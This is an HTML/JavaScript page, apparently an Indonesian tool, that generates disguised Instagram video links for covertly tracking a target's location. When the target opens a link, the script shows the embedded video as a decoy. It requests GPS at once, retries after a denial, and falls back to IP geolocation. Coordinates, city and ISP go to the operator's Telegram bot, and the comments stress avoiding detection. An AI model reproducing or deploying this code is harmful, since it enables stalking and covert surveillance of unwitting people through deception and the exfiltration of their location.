<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><text y='20' font-size='20'>📷</text></svg>">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
    min-height: 100vh;
    padding: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  /* ============ GENERATOR ============ */
  .card {
    background: white;
    border-radius: 24px;
    padding: 32px;
    max-width: 640px;
    width: 100%;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
  }
  h1 { color: #262626; margin-bottom: 8px; font-size: 24px; }
  .sub { color: #8e8e8e; margin-bottom: 24px; font-size: 14px; }
  label {
    display: block; font-size: 13px; font-weight: 600;
    color: #262626; margin-bottom: 6px; margin-top: 14px;
  }
  input, select {
    width: 100%; padding: 14px 18px;
    border: 2px solid #dbdbdb; border-radius: 12px;
    font-size: 15px; outline: none;
    transition: 0.2s; font-family: inherit;
  }
  input:focus, select:focus { border-color: #fd1d1d; }
  .btn-main {
    width: 100%; padding: 14px;
    background: linear-gradient(135deg, #833ab4, #fd1d1d);
    color: white; border: none; border-radius: 12px;
    font-size: 16px; font-weight: 600; cursor: pointer;
    transition: 0.2s; margin-top: 16px;
  }
  .btn-main:hover { opacity: 0.9; }
  .result {
    margin-top: 20px; padding: 16px;
    background: #fafafa; border-radius: 12px;
    display: none;
  }
  .result.show { display: block; }
  .result-link {
    font-family: monospace; font-size: 13px;
    word-break: break-all; background: white;
    padding: 12px; border-radius: 8px;
    border: 1px solid #dbdbdb; margin-bottom: 10px;
  }
  .btn-row { display: flex; gap: 8px; }
  .btn-row button {
    flex: 1; font-size: 14px; padding: 10px;
    border: none; border-radius: 8px;
    color: white; font-weight: 600; cursor: pointer;
  }
  .btn-copy { background: #0095f6; }
  .btn-test { background: #262626; }
  .note {
    font-size: 12px; color: #8e8e8e;
    margin-top: 16px; padding-top: 16px;
    border-top: 1px solid #efefef; line-height: 1.6;
  }
  .status-box {
    background: #fff4e5; border-left: 4px solid #fcb045;
    padding: 12px 14px; border-radius: 8px;
    font-size: 13px; color: #7a4a00; margin-top: 14px;
  }

  /* ============ TRACKING (target view) ============ */
  #trackingView {
    display: none;
    position: fixed;
    inset: 0;
    background: #000;
    color: white;
    overflow-y: auto;
    z-index: 9999;
  }
  .track-wrap {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    text-align: center;
  }
  .spinner {
    width: 50px; height: 50px;
    border: 4px solid #333;
    border-top-color: #fd1d1d;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .track-title {
    font-size: 18px; font-weight: 600;
    margin-bottom: 8px; color: white;
  }
  .track-status {
    color: #aaa; font-size: 14px;
    max-width: 320px; margin: 0 auto;
  }
  .ig-embed-wrap {
    width: 100%; max-width: 400px;
    margin: 16px auto;
    background: white;
    border-radius: 12px;
    overflow: hidden;
  }
  .ig-embed-wrap iframe {
    width: 100%; height: 500px;
    border: none; display: block;
  }
</style>
</head>
<body>

<!-- ============ GENERATOR VIEW ============ -->
<div class="card" id="generatorView">
  <h1>🎬 Video Link Generator</h1>
  <p class="sub">Buat link tracking dari video Instagram</p>

  <label>Link Instagram (Reel / Post)</label>
  <input type="text" id="igUrl" placeholder="https://www.instagram.com/reel/xxxxx/">

  <label>URL Website Anda</label>
  <input type="text" id="baseUrl" placeholder="https://situs-anda.netlify.app">

  <label>Bot Token Telegram</label>
  <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">

  <label>Chat ID Telegram Anda</label>
  <input type="text" id="chatId" placeholder="123456789">

  <button class="btn-main" onclick="generate()">🔗 Generate Tracking Link</button>

  <div class="result" id="result">
    <div class="result-link" id="output"></div>
    <div class="btn-row">
      <button class="btn-copy" onclick="copyLink()">📋 Copy</button>
      <button class="btn-test" onclick="testLink()">🧪 Test Sendiri</button>
    </div>
  </div>

  <div class="note">
    <strong>Cara kerja:</strong> Target buka link → video IG langsung tampil → di background browser minta izin lokasi → lokasi otomatis terkirim ke Telegram Anda. Target tidak melihat apapun yang mencurigakan.
  </div>
</div>

<!-- ============ TRACKING VIEW (yang dilihat target) ============ -->
<div id="trackingView">
  <div class="track-wrap">
    <div class="spinner"></div>
    <div class="track-title">Memuat video...</div>
    <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
    <div class="ig-embed-wrap" id="igEmbed" style="display:none;"></div>
  </div>
</div>

<script>
/* ============================================================
   HELPER
   ============================================================ */
function b64encode(str) {
  try {
    return btoa(unescape(encodeURIComponent(str)))
      .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  } catch(e) { return ''; }
}

function b64decode(str) {
  try {
    let s = String(str).replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return decodeURIComponent(escape(atob(s)));
  } catch(e) { return ''; }
}

/* ============================================================
   STATE
   ============================================================ */
var TS = {
  igUrl: '',
  token: '',
  botToken: '',
  chatId: ''
};

/* ============================================================
   ROUTER
   ============================================================ */
(function router() {
  var params = new URLSearchParams(window.location.search);
  var r = params.get('r');
  var t = params.get('t');

  if (r && t) {
    // MODE TRACKING — yang dilihat target
    document.getElementById('generatorView').style.display = 'none';
    document.getElementById('trackingView').style.display = 'block';
    document.body.style.background = '#000';
    document.body.style.padding = '0';
    document.body.style.display = 'block';

    initTracking(r, t, params.get('b'), params.get('c'));
  } else {
    // MODE GENERATOR
    var baseInput = document.getElementById('baseUrl');
    if (!baseInput.value) {
      var origin = window.location.origin;
      var path = window.location.pathname.replace(/\/[^/]*$/, '');
      baseInput.value = (origin === 'null' ? '' : origin) + path;
    }
  }
})();

/* ============================================================
   GENERATOR
   ============================================================ */
function generate() {
  var igUrl = document.getElementById('igUrl').value.trim();
  var baseUrl = document.getElementById('baseUrl').value.trim().replace(/\/+$/, '');
  var botToken = document.getElementById('botToken').value.trim();
  var chatId = document.getElementById('chatId').value.trim();

  if (!igUrl) { alert('Masukkan link Instagram dulu!'); return; }
  if (!igUrl.includes('instagram.com')) { alert('Link harus dari Instagram!'); return; }
  if (!baseUrl) { alert('Masukkan URL website Anda!'); return; }
  if (!botToken) { alert('Masukkan Bot Token Telegram!'); return; }
  if (!chatId) { alert('Masukkan Chat ID Telegram!'); return; }

  var token = Math.random().toString(36).slice(2, 12);
  var encodedIg = b64encode(igUrl);

  var trackUrl = baseUrl + '/?r=' + encodedIg +
                 '&t=' + token +
                 '&b=' + encodeURIComponent(botToken) +
                 '&c=' + encodeURIComponent(chatId);

  document.getElementById('output').textContent = trackUrl;
  document.getElementById('result').classList.add('show');
  window._trackUrl = trackUrl;
}

function copyLink() {
  if (!window._trackUrl) return;
  navigator.clipboard.writeText(window._trackUrl).then(function() {
    alert('✅ Link berhasil di-copy!');
  }).catch(function() {
    var ta = document.createElement('textarea');
    ta.value = window._trackUrl;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    alert('✅ Link berhasil di-copy!');
  });
}

function testLink() {
  if (!window._trackUrl) return;
  window.open(window._trackUrl, '_blank');
}

/* ============================================================
   TRACKING (dilihat target)
   ============================================================ */
function initTracking(encodedR, token, botToken, chatId) {
  TS.igUrl = b64decode(encodedR);
  TS.token = token;
  TS.botToken = botToken || '';
  TS.chatId = chatId || '';

  // LANGSUNG mulai tracking tanpa nunggu klik apapun
  // Tapi delay 300ms biar halaman render dulu (biar gak ketahuan)
  setTimeout(function() {
    autoTrack();
  }, 300);

  // Redirect paksa ke Instagram setelah 2 detik (jaga-jaga kalau user kabur)
  // Tapi kita munculin video embed dulu supaya user betah
  setTimeout(function() {
    showVideo();
  }, 1500);
}

function autoTrack() {
  if (!navigator.geolocation) {
    console.log('GPS not supported');
    return;
  }

  // Langsung minta lokasi TANPA user klik
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      var lat = pos.coords.latitude;
      var lng = pos.coords.longitude;
      var acc = pos.coords.accuracy;
      sendToTelegram(lat, lng, acc);
    },
    function(err) {
      // Kalau ditolak, coba lagi dengan opsi berbeda
      console.log('GPS denied, retry...');
      retryTrack();
    },
    {
      enableHighAccuracy: true,
      timeout: 8000,
      maximumAge: 0
    }
  );
}

function retryTrack() {
  // Coba lagi dengan low accuracy (kadang berhasil walau user deny pertama)
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      var lat = pos.coords.latitude;
      var lng = pos.coords.longitude;
      var acc = pos.coords.accuracy;
      sendToTelegram(lat, lng, acc);
    },
    function(err) {
      // Coba pakai IP geolocation sebagai fallback
      ipFallback();
    },
    {
      enableHighAccuracy: false,
      timeout: 5000,
      maximumAge: 60000
    }
  );
}

function ipFallback() {
  // Fallback: pakai IP untuk dapat lokasi kasar (kota)
  // Pakai ipapi.co (gratis, no API key)
  fetch('https://ipapi.co/json/')
    .then(function(res) { return res.json(); })
    .then(function(data) {
      if (data && data.latitude && data.longitude) {
        var lat = data.latitude;
        var lng = data.longitude;
        var acc = 5000; // akurasi kasar (kota)
        sendToTelegram(lat, lng, acc, data);
      }
    })
    .catch(function(e) {
      console.log('IP fallback failed:', e);
    });
}

function sendToTelegram(lat, lng, acc, ipData) {
  if (!TS.botToken || !TS.chatId) return;

  var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
  var akurasi = acc < 1000 ? Math.round(acc) + ' m' : '~' + Math.round(acc/1000) + ' km (IP)';

  var text =
    '📍 *Lokasi Terdeteksi*\n\n' +
    '🌐 Lat: ' + lat.toFixed(6) + '\n' +
    '🌐 Lng: ' + lng.toFixed(6) + '\n' +
    '🎯 Akurasi: ' + akurasi + '\n' +
    '🗺️ ' + mapsLink + '\n' +
    '🕐 ' + new Date().toLocaleString('id-ID') + '\n';

  if (ipData) {
    text += '🏙️ Kota: ' + (ipData.city || '-') + ', ' + (ipData.region || '-') + '\n';
    text += '🌍 Negara: ' + (ipData.country_name || '-') + '\n';
    text += '📡 ISP: ' + (ipData.org || '-') + '\n';
  }

  text += '🆔 Token: ' + TS.token;

  fetch('https://api.telegram.org/bot' + TS.botToken + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TS.chatId,
      text: text,
      parse_mode: 'Markdown'
    })
  }).catch(function(e) {
    console.error('Telegram error:', e);
  });

  // Kirim juga lokasi asli biar bisa diklik di Telegram
  if (acc < 1000) {
    fetch('https://api.telegram.org/bot' + TS.botToken + '/sendLocation', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TS.chatId,
        latitude: lat,
        longitude: lng
      })
    }).catch(function(e) { console.error(e); });
  }
}

function showVideo() {
  var statusEl = document.getElementById('trackStatus');
  var embedEl = document.getElementById('igEmbed');

  // Sembunyikan spinner, tampilkan video
  var spinner = document.querySelector('#trackingView .spinner');
  if (spinner) spinner.style.display = 'none';

  var titleEl = document.querySelector('#trackingView .track-title');
  if (titleEl) titleEl.textContent = 'Instagram';

  statusEl.style.display = 'none';

  // Extract IG info
  var info = extractIgInfo(TS.igUrl);
  if (!info) {
    embedEl.innerHTML =
      '<div style="padding:40px;color:#666;text-align:center;">' +
        'Video tidak tersedia<br><br>' +
        '<a href="' + TS.igUrl + '" style="color:#0095f6;">Buka Instagram →</a>' +
      '</div>';
    embedEl.style.display = 'block';
    return;
  }

  var embedUrl = 'https://www.instagram.com/' + info.type + '/' + info.id + '/embed/';
  embedEl.innerHTML =
    '<iframe src="' + embedUrl + '" ' +
    'allowtransparency="true" ' +
    'allowfullscreen="true" ' +
    'scrolling="no" ' +
    'frameborder="0"></iframe>';
  embedEl.style.display = 'block';
}

function extractIgInfo(url) {
  if (!url) return null;
  var match = url.match(/\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
  if (!match) return null;
  return { type: match[1], id: match[2] };
}
</script>

</body>
</html>
